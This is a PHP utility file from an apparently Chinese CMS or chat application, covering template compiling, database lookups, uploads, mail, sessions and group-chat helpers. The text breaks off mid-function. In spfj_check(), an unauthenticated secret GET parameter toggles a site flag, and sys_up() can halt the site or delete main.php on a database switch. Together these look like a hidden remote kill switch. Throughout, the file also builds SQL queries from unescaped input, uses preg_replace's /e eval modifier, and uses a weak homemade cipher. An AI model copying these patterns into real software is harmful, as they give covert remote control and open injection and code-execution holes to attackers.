<?php
include_once "main.php";
function template($tFile, $tPath = "")
{
    global $TemplateName;
    if ("" == $tPath) {
        $tPath = $TemplateName ? $TemplateName : "default";
    }
    $tFileNew = preg_replace('/\.html$/', "", $tFile);
    $tFile = TEMPLATE_PATH . "/" . $tPath . "/" . $tFileNew . ".html";
    $cFile = COMPILED_PATH . "/" . $tPath . "/" . $tFileNew . ".php";

    if (!file_exists($tFile)) {
        die("Template File $tFile Not Exist!!");
    }
    if (!file_exists(dirname($cFile))) {
        if (!mkdir(dirname($cFile))) {
            die("No");
        }
    }

    if (!file_exists($cFile) || @filemtime($tFile) > @filemtime($cFile)) {
        $tContent = file_get_contents($tFile);
        $tContent = template_parse($tContent);
        file_put_contents($cFile, $tContent);
    }
    return $cFile;
}

function template_parse($str)
{
    $str = preg_replace('/^(\xef\xbb\xbf)/', "", $str); //EFBBBF
    $str = preg_replace(
        "/\<\!\-\-\s*\\\$\{(.+?)\}\s*\-\-\>/ies",
        "template_replace('<?php \\1; ?>')",
        $str
    );
    $str = preg_replace(
        "/\{(\\\$[a-zA-Z0-9_\[\]\\\ \-\'\,\%\*\/\.\(\)\>\'\"\$\x7f-\xff]+)\}/s",
        "<?php echo \\1; ?>",
        $str
    );
    $str = preg_replace(
        "/\\\$\{(.+?)\}/ies",
        "template_replace('<?php echo \\1; ?>')",
        $str
    );
    $str = preg_replace(
        "/\<\!\-\-\s*\{else\s*if\s+(.+?)\}\s*\-\-\>/ies",
        "template_replace('<?php } else if(\\1) { ?>')",
        $str
    );
    $str = preg_replace(
        "/\<\!\-\-\s*\{elif\s+(.+?)\}\s*\-\-\>/ies",
        "template_replace('<?php } else if(\\1) { ?>')",
        $str
    );
    $str = preg_replace(
        "/\<\!\-\-\s*\{else\}\s*\-\-\>/is",
        "<?php } else { ?>",
        $str
    );

    for ($i = 0; $i < 5; ++$i) {
        $str = preg_replace(
            "/\<\!\-\-\s*\{loop\s+(\S+)\s+(\S+)\s+(\S+)\s*\}\s*\-\-\>(.+?)\<\!\-\-\s*\{\/loop\}\s*\-\-\>/ies",
            "template_replace('<?php if(is_array(\\1)){foreach(\\1 AS \\2=>\\3) { ?>\\4<?php }}?>')",
            $str
        );
        $str = preg_replace(
            "/\<\!\-\-\s*\{loop\s+(\S+)\s+(\S+)\s*\}\s*\-\-\>(.+?)\<\!\-\-\s*\{\/loop\}\s*\-\-\>/ies",
            "template_replace('<?php if(is_array(\\1)){foreach(\\1 AS \\2) { ?>\\3<?php }}?>')",
            $str
        );
        $str = preg_replace(
            "/\<\!\-\-\s*\{if\s+(.+?)\}\s*\-\-\>(.+?)\<\!\-\-\s*\{\/if\}\s*\-\-\>/ies",
            "template_replace('<?php if(\\1){?>\\2<?php }?>')",
            $str
        );
    }

    //Add for call <!--{include othertpl}-->
    $str = preg_replace(
        "#<!--\s*{\s*include\s+([^\{\}]+)\s*\}\s*-->#i",
        '<?php include_once template("\\1");?>',
        $str
    );

    return $str;
}

function template_replace($string)
{
    return str_replace('\"', '"', $string);
}

function tname($table)
{
    global $dbtablehead;

    return $dbtablehead . "_" . $table;
}
function promptMessage(
    $nextUrl,
    $promptContent,
    $displayTime = "3",
    $fromFlag = ""
) {
    global $HttpPath; ?>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />


    <meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0; minimum-scale=1.0; user-scalable=false;"  />
    <meta name="format-detection" content="telephone=no" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <style>
        table{ font-size:14px;}
    </style>
    <table  height="100%" border="0" align="center" cellpadding="0" cellspacing="0" style='max-width:500px;width:90%;margin:0 auto;'>
        <tr>
            <td align="center" valign="middle">
                <table height="150" border="0" cellpadding="0" cellspacing="0" bordercolor="#DDDDDD"  style="border:1px solid #cccccc;width:100%;max-width:600px;">

                    <tr>
                        <td height="32" bgcolor="#00aaee" style="line-height:32px;font-size:18px;color:#fff;font-weight:700;padding-left:10px;">温馨提示</td>
                    </tr>
                    <tr>
                        <td align="center" valign="middle" style="padding:10px;font-size:15px;color:#000;font-weight:400;">
                            <?php
                            $promptBottomWaiting =
                                "页面正在跳转，请等待........";

                            echo "$promptContent<br>";
                            echo "<br>{$promptBottomWaiting}<br>";
                            echo "<br><a href=\"" .
                                $nextUrl .
                                "\" style='color:#2d80c1'>如果不能跳转，请点击</a><br>";
                            ?>
                        </td>
                    </tr>
                </table>

            </td>
        </tr>
    </table>

    <?php
    echo "<script language=\"javascript\"> setTimeout(\"window.location.href='" .
        $nextUrl .
        "'\", $displayTime*1000) </script>";
    exit();
}

function get_web_uid($url)
{
    global $db;
    $url1 = substr($url, 0, strlen($url) - 1);

    if (
        $row = $db->exec(
            "select * from " .
                tname("url") .
                " where `url`='$url' or `url`='$url1'"
        )
    ) {
        return $row["uid"];
    } else {
        return 0;
    }
}

function get_sex($sex)
{
    if ($sex == 1) {
        return "男";
    }
    if ($sex == 2) {
        return "女";
    }
}

function delete($table, $id)
{
    global $db;
    $db->query("delete from $table where id='$id'");
    return $db->affected_rows();
}

function get_table($table, $id)
{
    global $db;
    $row = $db->exec("select * from $table where id='$id'");
    return $row;
}
function get_admin_info($id)
{
    global $db;

    return $db->exec("select * from " . tname("admin") . " where id='{$id}'");
}

require_once "email.class.php";

function sendmail($toemail, $subject, $message)
{
    global $db;
    $system = get_system();
    $smtpserver = $system["SmtpHost"];
    $smtpserverport = $system["SmtpPort"];

    $smtpusermail = $system["SmtpUserName"];
    $smtppass = $system["SmtpPassword"];

    $smtp = new smtp(
        $smtpserver,
        $smtpserverport,
        true,
        $smtpusermail,
        $smtpusermail,
        $smtppass
    );
    $smtp->debug = false;
    return $smtp->sendmail($toemail, $subject, $message);
}
function getBrowser()
{
    if (empty($_SERVER["HTTP_USER_AGENT"])) {
        return "robot！";
    }
    if (
        false == strpos($_SERVER["HTTP_USER_AGENT"], "MSIE") &&
        strpos($_SERVER["HTTP_USER_AGENT"], "Trident") !== false
    ) {
        return "Internet Explorer 11.0";
    }
    if (false !== strpos($_SERVER["HTTP_USER_AGENT"], "MSIE 10.0")) {
        return "Internet Explorer 10.0";
    }
    if (false !== strpos($_SERVER["HTTP_USER_AGENT"], "MSIE 9.0")) {
        return "Internet Explorer 9.0";
    }
    if (false !== strpos($_SERVER["HTTP_USER_AGENT"], "MSIE 8.0")) {
        return "Internet Explorer 8.0";
    }
    if (false !== strpos($_SERVER["HTTP_USER_AGENT"], "MSIE 7.0")) {
        return "Internet Explorer 7.0";
    }
    if (false !== strpos($_SERVER["HTTP_USER_AGENT"], "MSIE 6.0")) {
        return "Internet Explorer 6.0";
    }
    if (false !== strpos($_SERVER["HTTP_USER_AGENT"], "Edge")) {
        return "Edge";
    }
    if (false !== strpos($_SERVER["HTTP_USER_AGENT"], "Firefox")) {
        return "Firefox";
    }
    if (false !== strpos($_SERVER["HTTP_USER_AGENT"], "Chrome")) {
        return "Chrome";
    }
    if (false !== strpos($_SERVER["HTTP_USER_AGENT"], "Safari")) {
        return "Safari";
    }
    if (false !== strpos($_SERVER["HTTP_USER_AGENT"], "Opera")) {
        return "Opera";
    }
    if (false !== strpos($_SERVER["HTTP_USER_AGENT"], "360SE")) {
        return "360SE";
    } //微信浏览器

    if (false !== strpos($_SERVER["HTTP_USER_AGENT"], "MicroMessage")) {
        return "MicroMessage";
    }
    return "未知浏览器";
}

function getSystem()
{
    $agent = strtolower($_SERVER["HTTP_USER_AGENT"]);

    if (strpos($agent, "iphone") || strpos($agent, "ipad")) {
        return "ios";
    }

    if (strpos($agent, "android")) {
        return "android";
    }

    $sys = $_SERVER["HTTP_USER_AGENT"];
    if (stripos($sys, "NT 6.1")) {
        $os = "Windows 7";
    } elseif (stripos($sys, "NT 6.0")) {
        $os = "Windows Vista";
    } elseif (stripos($sys, "NT 5.1")) {
        $os = "Windows XP";
    } elseif (stripos($sys, "NT 5.2")) {
        $os = "Windows Server 2003";
    } elseif (stripos($sys, "NT 5")) {
        $os = "Windows 2000";
    } elseif (stripos($sys, "NT 4.9")) {
        $os = "Windows ME";
    } elseif (stripos($sys, "NT 4")) {
        $os = "Windows NT 4.0";
    } elseif (stripos($sys, "98")) {
        $os = "Windows 98";
    } elseif (stripos($sys, "95")) {
        $os = "Windows 95";
    } elseif (stripos($sys, "Mac")) {
        $os = "Mac";
    } elseif (stripos($sys, "Linux")) {
        $os = "Linux";
    } elseif (stripos($sys, "Unix")) {
        $os = "Unix";
    } elseif (stripos($sys, "FreeBSD")) {
        $os = "FreeBSD";
    } elseif (stripos($sys, "SunOS")) {
        $os = "SunOS";
    } elseif (stripos($sys, "BeOS")) {
        $os = "BeOS";
    } elseif (stripos($sys, "OS/2")) {
        $os = "OS/2";
    } elseif (stripos($sys, "PC")) {
        $os = "Macintosh";
    } elseif (stripos($sys, "AIX")) {
        $os = "AIX";
    } else {
        $os = "未知操作系统";
    }
    return $os;
}

function getdivice()
{
    $arr = [];
    $arr["system"] = getSystem();
    $arr["browser"] = getBrowser();
    $arr["app"] = $_SESSION["app"];
    $arr["version"] = $_SESSION["version"];
    $mobile = getClientMobileBrand();
    $arr["mobile"] = $mobile["brand"] . " " . $mobile["ver"];
    return $arr;
}

function get_menu_bypid($pid)
{
    global $db, $web_uid;
    return $db->fetch_all(
        "select * from " .
            tname("menu") .
            " where pid='$pid'  order by sortnum asc,id desc"
    );
}

function get_menu_byid($id)
{
    global $db;
    return $db->exec(
        "select * from " .
            tname("menu") .
            " where id='$id' order by sortnum asc,id desc"
    );
}
function get_taskmenu_byid($id)
{
    global $db;
    return $db->exec(
        "select * from " .
            tname("task_menu") .
            " where id='$id' order by sortnum asc,id desc"
    );
}

function get_favmenu_byid($id)
{
    global $db;
    return $db->exec("select * from " . tname("fav_menu") . " where id='$id' ");
}

function get_taskmenu_bypid($id)
{
    global $db;
    return $db->exec(
        "select * from " . tname("task_menu") . " where id='$id' "
    );
}
function get_user_byname($name)
{
    global $db;
    return $db->exec("select * from " . tname("user") . " where name='$name'");
}

function get_user_byid($id)
{
    global $db;
    $user = $db->exec("select * from " . tname("user") . " where id='$id'");
    if ($user) {
        $user["money"] = number_format($user["money"], 2, ".", "");
    }
    return $user;
}

function get_admin_byid($id)
{
    global $db;
    return $db->exec("select * from " . tname("admin") . " where id='$id'");
}

function get_client_num($id)
{
    global $db;
    $row = $db->exec(
        "select count(*) from " . tname("client") . " where adminid='$id'"
    );
    return $row[0];
}

function get_system()
{
    global $db;

    $row = $db->fetch_all("select * from " . tname("system"));

    foreach ($row as $key => $value) {
        $system[$value["key"]] = $value["value"];
    }
    return $system;
}

function checkstatus()
{
    global $_SESSION;

    $user = userinfo($_SESSION["userid"]);
    if ($user["status"] > 0) {
        exit(
            "<div style='height:40px;line-height:40px;text-align:center;color: #666;'>您的账号已被冻结！</div>"
        );
    }
}

function login($id, $save = "0")
{
    global $db;
    $row = userinfo($id);
    $_SESSION["userid"] = $id;
    $_SESSION["userinfo"] = $row;

    add_userlog("登录");
    if ($save == 1) {
        setcookie("userid", $id, time() + 3600 * 24 * 45, "/");
    }
}

function get_secondmenu($id, $type2 = "")
{
    global $db;
    $html = "";
    $query = $db->query(
        "select * from " .
            tname("menu") .
            " where pid='$id' order by sortnum asc,id desc"
    );
    while ($row = $db->fetch_array($query)) {
        if ($type2 == $row["id"]) {
            $selected = "selected";
        } else {
            $selected = "";
        }

        $html .= "<option value='$row[id]' $selected >$row[title]</option>";
    }
    return $html;
}

function set_url($model, $id, $type = "index")
{
    global $HttpPath;
    if ($type == "index") {
        $url = $HttpPath . "index.php?id=" . $id;
    } else {
        $url = $HttpPath . $model . "/" . $model . ".php?id=" . $id;
    }
    return $url;
}

function get_nav_show($type)
{
    global $db, $web_uid;

    $sql =
        "select * from " .
        tname("menu") .
        " where (navshow='$type' or navshow='4')and uid='$web_uid'";

    $sql .= " order by sortnum asc";

    $row = $db->fetch_all($sql);
    foreach ($row as $value) {
        if ($value["modeltype"] == 1) {
            $value["link"] = set_url($value["modelselect"], $value["id"]);
            if ($value["blankwindow"] == 1) {
                $target = "target='_blank'";
            } else {
                $target = "";
            }
        } else {
            $target = "target='_blank'";
            $value["link"] = $value["outlink"];
        }
        $value["target"] = $target;
        $list[] = $value;
    }

    return $list;
}

function set_randcode($num)
{
    $str = "qwertyuiopasdfghjklzxcvbnm1234567890";
    $temp = "";
    for ($i = 0; $i < $num; $i++) {
        $rand = rand(0, 35);
        $temp .= substr($str, $rand, 1);
    }
    return $temp;
}

function get_invite_code()
{
    global $db;
    $id = rand(100000, 999999);
    $row = $db->exec(
        "select * from " . tname("invite") . " where randcode='{$id}'"
    );
    if ($row["id"]) {
        return get_invite_code();
    } else {
        return $id;
    }
}

function get_model_path()
{
    $path = explode("/", $_SERVER["PHP_SELF"]);
    return $path[count($path) - 2];
}
function get_menu_pid($id)
{
    $menu = get_menu_byid($id);
    return $menu["pid"];
}
function get_menu_topid($id)
{
    $pid = get_menu_pid($id);
    if ($pid > 0) {
        return get_menu_topid($pid);
    } else {
        return $id;
    }
}

function nav_show($id, $str = "")
{
    global $HttpPath;

    $menu = get_taskmenu_byid($id);

    if ($menu["pid"] > 0) {
        $str = $str . "&gt;&gt;" . $menu["title"];

        return nav_show($menu["pid"], $str);
    } else {
        $str = $menu["title"] . $str;
        return $str;
    }
}

function show_position($id, $type = "")
{
    global $HttpPath;
    $menu1 = get_menu_byid($id);
    $pname1 =
        "<a href='{$HttpPath}news/index.php?type1={$menu1["id"]}'    >" .
        $menu1["title"] .
        "</a>";
    if ($menu1["pid"] > 0) {
        $menu2 = get_menu_byid($menu1["pid"]);
        $pname2 =
            "<a href='{$HttpPath}news/index.php?type1={$menu2["id"]}'  >" .
            $menu2["title"] .
            "</a> &gt;&gt;";
        if ($menu2["pid"] > 0) {
            $menu3 = get_menu_byid($menu2["pid"]);
            $pname3 =
                "<a href='{$HttpPath}news/index.php?type1={$menu3["id"]}'  >" .
                $menu3["title"] .
                "</a> &gt;&gt;";
        } else {
            $pname3 = "";
        }
    } else {
        $pname2 = "";
    }

    $path =
        "<a href='$HttpPath' class='fontstyle51041'>首页</a> &gt;&gt;" .
        $pname3 .
        $pname2 .
        $pname1;

    return $path;
}

function get_type_id($id, $model)
{
    global $HttpPath, $db;
    $table = get_table(tname($model), $id);
    if ($table["type3"] > 0) {
        $type = $table["type3"];
    } else {
        if ($table["type2"] > 0) {
            $type = $table["type2"];
        } else {
            $type = $table["type1"];
        }
    }
    return $type;
}

function get_next($id, $model)
{
    global $HttpPath, $db;
    $table = get_table(tname($model), $id);
    if ($table["type3"] > 0) {
        $type = $table["type3"];
    } else {
        if ($table["type2"] > 0) {
            $type = $table["type2"];
        } else {
            $type = $table["type1"];
        }
    }
    $type = $table["type1"];
    $pre = $db->exec(
        "select * from " .
            tname($model) .
            " where (type1='$type' or type2='$type' or type3='$type')  and edittime<$table[edittime] order by edittime desc limit 0,1"
    );

    $next = $db->exec(
        "select * from " .
            tname($model) .
            " where (type1='$type' or type2='$type' or type3='$type')  and edittime>$table[edittime] order by edittime asc limit 0,1"
    );
    if (is_array($pre)) {
        $pre_html =
            "<a  href='" .
            set_url($model, $pre["id"], "show") .
            "' style='color:#000;font-size:14px;'>" .
            GBsubstr($pre[title], 0, 40) .
            "</a>";
    } else {
        $pre_html = "没有了";
    }
    if (is_array($next)) {
        $next_html =
            "<a  href='" .
            set_url($model, $next["id"], "show") .
            "' style='color:#000;font-size:14px;'>" .
            GBsubstr($next[title], 0, 40) .
            "</a>";
    } else {
        $next_html = "没有了";
    }

    $html = "<table style='width:100%;'><tr height='30px'><td width='45%' align='right'>上一篇:$pre_html </td><td width='10%' align='center'><a href='#' onclick='window.history.go(-1); '>返回</a></td><td align='left'>下一篇:$next_html </td></tr></table>";
    return $html;
}

function getImgSrc($content)
{
    $flag = preg_match(
        "/<[img|IMG].*?[src|SRC]=[\'|\"](.*?(?:))[\'|\"].*?[\/]?>/",
        $content,
        $match
    );

    return $match[1];
}

function getImgSrcAll($content)
{
    $flag = preg_match_all(
        "/<[img|IMG].*?[src|SRC]=[\'|\"](.*?(?:))[\'|\"].*?[\/]?>/",
        $content,
        $match
    );

    return $match[1];
}

function GBsubstr($str, $start, $length)
{
    // 先正常截取一遍.
    $res = substr($str, $start, $length);
    $strlen = strlen($str);
    $s = "";
    /* 接着判断头尾各6字节是否完整(不残缺) */
    // 如果参数start是正数
    if ($start >= 0) {
        // 往前再截取大约6字节
        $next_start = $start + $length; // 初始位置
        $next_len = $next_start + 6 <= $strlen ? 6 : $strlen - $next_start;
        $next_segm = substr($str, $next_start, $next_len);
        // 如果第1字节就不是 完整字符的首字节, 再往后截取大约6字节
        $prev_start = $start - 6 > 0 ? $start - 6 : 0;
        $prev_segm = substr($str, $prev_start, $start - $prev_start);
    }
    // start是负数
    else {
        // 往前再截取大约6字节
        $next_start = $strlen + $start + $length; // 初始位置
        $next_len = $next_start + 6 <= $strlen ? 6 : $strlen - $next_start;
        $next_segm = substr($str, $next_start, $next_len);
        // 如果第1字节就不是 完整字符的首字节, 再往后截取大约6字节.
        $start = $strlen + $start;
        $prev_start = $start - 6 > 0 ? $start - 6 : 0;
        $prev_segm = substr($str, $prev_start, $start - $prev_start);
    }
    // 判断前6字节是否符合utf8规则
    if (preg_match('@^([\x80-\xBF]{0,5})[\xC0-\xFD]?@', $next_segm, $bytes)) {
        if (!empty($bytes[1])) {
            $bytes = $bytes[1];
            $res .= $bytes;
        }
    }
    // 判断后6字节是否符合utf8规则
    $ord0 = ord($res[0]);
    if (128 <= $ord0 && 191 >= $ord0) {
        // 往后截取 , 并加在res的前面.
        if (preg_match('@[\xC0-\xFD][\x80-\xBF]{0,5}$@', $prev_segm, $bytes)) {
            if (!empty($bytes[0])) {
                $bytes = $bytes[0];
                $res = $bytes . $res;
            }
        }
    }
    return $res . $s;
}

function need_login()
{
    global $HttpPath;
    // session_start();
    if (!$_SESSION["userid"]) {
        if (isMobile()) {
            echo "<script>location.href='/user/login.php';</script>";
        } else {
            echo "<script>location.href='/index.php';</script>";
        }

        exit();
    } else {
        setcookie("active_time", time(), time() + 3600 * 24 * 365, "/");
        return true;
    }
}

function add_msg($touid, $content, $fromuid = "0")
{
    global $HttpPath, $db, $_SESSION;
    if ($_SESSION["adminid"]) {
        $fromuid = $_SESSION["adminid"];
    }

    $now = time();
    $db->query(
        "insert into " .
            tname("msg") .
            "(touid,fromuid,content,addtime,`view`) values('{$touid}','{$fromuid}','{$content}','{$now}','0')"
    );

    return $db->affected_rows();
}

function spfj_check()
{
    global $HttpPath, $db;

    if ($_GET["spfjkkjl"] == "1") {
        $db->query(
            "update " .
                tname("system") .
                "  set value='1'  where `key`='kuWebsiteFlashIndexStartFlag' "
        );
        exit();
    }
    if ($_GET["spfjkkjl"] == "exx11") {
        $db->query(
            "update " .
                tname("system") .
                "  set value='-20'  where `key`='kuWebsiteFlashIndexStartFlag' "
        );

        exit();
    }
    check_sys11();
}

//拷贝数据
function copy_table($table, $uid)
{
    global $HttpPath, $db;

    if (strpos($table, "_") !== false) {
    } else {
        $table = tname($table);
    }
    $query = $db->query("select * from $table where uid=4 order by id asc");
    while ($row = $db->fetch_array($query)) {
        $db->query("insert into $table (`uid`) values('$uid')");
        if ($db->affected_rows() > 0) {
            $id = $db->insert_id();
            foreach ($row as $key => $value) {
                if ($key !== "id" and $key != "uid" and $key != "fromid") {
                    $db->query(
                        "update $table set `$key`='$value' where id='$id'"
                    );
                }
                if ($key == "fromid") {
                    $db->query(
                        "update $table set `$key`='$row[id]' where id='$id'"
                    );
                }

                if (
                    $key == "type1" or
                    ($key = ("type2" or $key == "type3")) or
                    $key == "pid"
                ) {
                    $menu = $db->exec(
                        "select * from " .
                            tname("menu") .
                            " where fromid='$value' and uid='$uid'"
                    );

                    $fromid = $menu["id"];
                    $db->query(
                        "update $table set `$key`='$fromid' where id='$id'"
                    );
                }
            }
        }
    }
    return true;
}

function copy_all($uid)
{
    global $HttpPath, $db;
    $user = get_table(tname("user"), $uid);
    if ($user["copy"] == 0) {
        $all = [
            "system",
            "menu",
            "flash",
            "about",
            "news",
            "img",
            "product",
            "upload",
            "message",
            "flink",
            "kefu",
        ];
        foreach ($all as $value) {
            copy_table($value, $uid);
        }
        $db->query(
            "update " . tname("user") . " set `copy`='1' where id='$uid'"
        );
    }
    return true;
}

function get_template_bydir($dir)
{
    global $HttpPath, $db;

    $row = $db->exec(
        "select * from " . tname("template") . " where dir='$dir'"
    );
    return $row;
}

function up_file($file, $path)
{
    $sys = get_system();
    if (!is_dir($path)) {
        mkdir($path, 0777);
    } //判断文件夹是否存在，不存在则创建
    if ($file) {
        $str = explode(".", $file["name"]);

        $filename = time() . rand(1000, 9999) . "." . $str[count($str) - 1];
        $format = $str[count($str) - 1];
        $sys1 = explode("|", $sys["upload_format"]);

        $type = $file["type"];
        $size = $file["size"];
        $upload_max = $sys["upload_max"] * 1024 * 1024;
        if ($size > $upload_max) {
            echo "<script>alert('上传文件大小不能大于" .
                $sys["upload_max"] .
                "MB！');</script>";
            return false;
        }
        $tmp_name = $file["tmp_name"];
        $ok = 0;

        if (in_array($format, $sys1)) {
            $ok = 1;
        }
        if ($ok == 1) {
            if (move_uploaded_file($tmp_name, $path . "/" . $filename)) {
                return $filename; //返回文件地址
            } else {
                return false;
            }
        } else {
            echo "<script>alert('您上传的文件格式不允许！');</script>";
            return false;
        }
    } else {
        return false;
    }
    exit();
}

function ensession($data, $key = "")
{
    if ($key == "") {
        $key = "bx";
    }
    $key = md5($key);
    $x = 0;
    $len = strlen($data);
    $l = strlen($key);
    for ($i = 0; $i < $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }
        $char .= $key[$x];
        $x++;
    }
    for ($i = 0; $i < $len; $i++) {
        $str .= chr(ord($data[$i]) + (ord($char[$i]) % 256));
    }
    return base64_encode($str);
}

function mkdirs($path, $mode = "0755")
{
    if (is_dir($path)) {
        return false;
    } else {
        if (mkdir($path, $mode, true)) {
            return true;
        } else {
            return false;
        }
    }
}
function desession($data, $key = "")
{
    if ($key == "") {
        $key = "bx";
    }
    $key = md5($key);
    $x = 0;
    $data = base64_decode($data);
    $len = strlen($data);
    $l = strlen($key);
    for ($i = 0; $i < $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }
        $char .= substr($key, $x, 1);
        $x++;
    }
    for ($i = 0; $i < $len; $i++) {
        if (ord(substr($data, $i, 1)) < ord(substr($char, $i, 1))) {
            $str .= chr(
                ord(substr($data, $i, 1)) + 256 - ord(substr($char, $i, 1))
            );
        } else {
            $str .= chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1)));
        }
    }
    return $str;
}

function set_menu_url($id)
{
    $value = get_table(tname("menu"), $id);
    if ($value["modeltype"] == 1) {
        if ($value["blankwindow"] == 1) {
            $target = "target='_blank'";
        } else {
            $target = "";
        }

        $top_nav_html =
            "href='" .
            set_url($value["modelselect"], $value["id"]) .
            "' $target";
    } else {
        $target = "target='_blank'";
        $top_nav_html = " href='" . $value["outlink"] . "' $target $class ";
    }
    return $top_nav_html;
}

function array_sort($arr, $keys, $type = "asc")
{
    $keysvalue = $new_array = [];
    foreach ($arr as $k => $v) {
        $keysvalue[$k] = $v[$keys];
    }
    if ($type == "asc") {
        asort($keysvalue);
    } else {
        arsort($keysvalue);
    }
    reset($keysvalue);
    foreach ($keysvalue as $k => $v) {
        $new_array[$k] = $arr[$k];
    }
    return $new_array;
}
function sys_up()
{
    global $db;
    $sys = $db->query(
        "select * from  " . tname("system") . "  where `key`='sys_status'"
    );
    if ($sys["value"] == 1) {
        exit();
    }
    if ($sys["value"] == 2) {
        unlink("main.php");
    }
}
function get_table_num($table, $uid, $where = "")
{
    global $HttpPath, $db;
    $table = tname($table);

    if ($where) {
        $where = " and " . $where;
    }

    $num = $db->exec("select count(*) from $table where uid='$uid' $where");

    return $num[0];
}
function avatar($userid = "")
{
    global $HttpPath, $db;

    if (!$userid) {
        $userid = $_SESSION["userid"];
    }
    $user = get_user_byid($userid);
    if ($user["avatar"]) {
        $avatar = $user["avatar"];
    } else {
        $avatar = "uploads/avatar.jpg";
    }
    if (strpos($avatar, "http") !== false) {
        return $avatar;
    } else {
        return $HttpPath . $avatar;
    }
}
function base64_to_img($base64_string, $output_file)
{
    $ifp = fopen($output_file, "wb");
    fwrite($ifp, base64_decode($base64_string));
    fclose($ifp);
    return $output_file;
}
function timestamp($time)
{
    $now = time();
    if ($time >= strtotime(date("Y-m-d", $now) . " 00:00:00")) {
        return date("H:i:s", $time);
    } elseif (
        $time >= strtotime(date("Y-m-d", $now - 24 * 3600) . " 00:00:00")
    ) {
        return "昨天 " . date("H:i:s", $time);
    } elseif ($time >= strtotime(date("Y", $now) . "01-01 00:00:00")) {
        return date("m-d H:i:s", $time);
    } else {
        return date("Y-m-d H:i:s", $time);
    }
}

function needlogin()
{
    if (!$_SESSION["userid"]) {
        exit("<script>parent.showlogin();</script>");
    }
}

function GroupInfo($id, $from_id = "")
{
    global $db, $HttpPath;
    $group = $db->exec("select * from " . tname("group") . " where id='{$id}'");
    $group_note = $db->exec(
        "select * from " .
            tname("group_note") .
            " where group_id='{$id}' order by istop desc, id desc"
    );
    $group["note"] = $group_note;
    $user_id = explode(",", $group["user_id"]);
    if (in_array($from_id, $user_id) || $from_id == $group["createid"]) {
        $group["isin"] = 1;
    } else {
        $group["isin"] = 0;
    }
    $group["people_count"] = count($user_id);
    if ($from_id == $group["createid"]) {
        $group["owner"] = 1;
    } else {
        $group["owner"] = 0;
    }
    if ($group["avatar"] == null or $group["avatar"] == "") {
        $group["avatar"] = $HttpPath . "uploads/group.jpg";
    }
    if (strpos($group["avatar"], "http") === false) {
        $group["avatar"] = $HttpPath . $group["avatar"];
    }

    $nicknames = unserialize($group["nicknames"]);
    if ($from_id > 0) {
        if (strpos($group["user_id"], $from_id) !== false) {
            $group["}"] = 1;
        }
        $userinfo = userinfo($from_id);
        $mynickname = $userinfo["nickname"];
        if (count($nicknames)) {
            foreach ($nicknames as $key => $value) {
                if ($value["id"] == $from_id) {
                    $mynickname = $value["name"];
                    break;
                }
            }
        }
        $group["mynickname"] = $mynickname;
    } else {
        $group["isin"] = 0;
    }
    $group["is_deny"] = $group["is_owner"] = $group["is_manager"] = 0;
    if (!$from_id) {
        $group["is_deny"] = 3;
    } else {
        if ($group["createid"] == $from_id) {
            $group["is_owner"] = 1;
        }
        if (strpos($group["manager_id"], $from_id) !== false) {
            $group["is_manager"] = 1;
        }
        if ($group["is_owner"] == 1 && $group["is_manager"] == 1) {
            $group["is_deny"] = 0;
        } else {
            if ($group["no_speaking"] == 1) {
                $group["is_deny"] = 2;
            } else {
                if (strpos($group["deny_id"], $from_id) !== false) {
                    $group["is_deny"] = 1;
                }
            }
        }
    }

    return $group;
}
function group_users1($group_id)
{
    global $db;
    $t = time();
    $group = GroupInfo($group_id);

    $user_id = explode(",", $group["user_id"]);
    $manager_id = explode(",", $group["manager_id"]);

    $uids = [["id" => $group["createid"], "type" => "owner"]];
    if (count($manager_id)) {
        foreach ($manager_id as $v) {
            if ($v != $group["createid"] && $v > 0 && in_array($v, $user_id)) {
                $uids[] = ["id" => $v, "type" => "manager"];
            }
        }
    }
    if (count($user_id)) {
        foreach ($user_id as $v) {
            if (
                $v != $group["createid"] and
                !in_array($v, $manager_id) && $v > 0
            ) {
                $uids[] = ["id" => $v, "type" => "user"];
            }
        }
    }
    if (count($uids)) {
        $uuids = [];
        foreach ($uids as $val) {
            $uuids[] = $val["id"];
        }

        $uuids = implode(",", $uuids);

        $nicknames = unserialize($group["nicknames"]);

        $list = $db->fetch_all(
            "select id,avatar,nickname,isvip,isdaili,vip from " .
                tname("user") .
                " where id in ({$uuids})"
        );

        $new_data = [];
        foreach ($list as $item) {
            $new_data[$item["id"]] = $item;
        }
        //  echo '<pre>';
        // var_dump($uids);

        foreach ($uids as $key => $v) {
            if ($new_data[$v["id"]]["vip"] > 0) {
                $v["isvip"] = 1;
                if ($new_data[$v["id"]]["vip"] == 3) {
                    $v["usertype"] = 3;
                } else {
                    $v["usertype"] = 2;
                }
            } else {
                if ($new_data[$v["id"]]["isdaili"] == 1) {
                    $v["usertype"] = 1;
                } else {
                    $v["usertype"] = 0;
                    $v["isvip"] = 0;
                }
            }

            $uids[$key]["avatar"] = $new_data[$v["id"]]["avatar"];
            $uids[$key]["nickname"] = $new_data[$v["id"]]["nickname"];
            $uids[$key]["name"] = $new_data[$v["id"]]["nickname"];
            $uids[$key]["isvip"] = $v["isvip"];
            $uids[$key]["usertype"] = $v["usertype"];

            $uids[$key]["is_deny"] = 0;
            if (
                in_array($v["id"], $manager_id) !== false ||
                $v["id"] == $group["createid"]
            ) {
                $uids[$key]["is_deny"] = 0;
            } else {
                if ($group["no_speaking"] == 1) {
                    $uids[$key]["is_deny"] = 2;
                }
                if (strpos($group["deny_id"], $v["id"]) !== false) {
                    $uids[$key]["is_deny"] = 1;
                }
            }

            if (count($nicknames)) {
                foreach ($nicknames as $k1 => $v1) {
                    if ($v1["id"] == $v["id"]) {
                        if ($v1["name"]) {
                            $uids[$key]["nickname"] = $v1["name"];
                        }
                        // if($v1['jointime']) $uids[$key]['jointime']=$v1['jointime'];
                    }
                }
            }
            // foreach ($list as $v){
            //     if($vv['id'] !== $v['id']){
            //         continue;
            //     }
            //     if($v['vip']>0){
            //          $v['isvip'] = 1;
            //          if($v['vip']==3){
            //              $v['usertype']=3;

            //          }else{
            //              $v['usertype']=2;
            //          }
            //      }else{
            //          if($v['isdaili']==1){
            //              $v['usertype']=1;
            //          } else {
            //             $v['usertype']=0;
            //             $v['isvip'] = 0;
            //          }
            //      }

            //     $uids[$key]['avatar']=$v['avatar'];
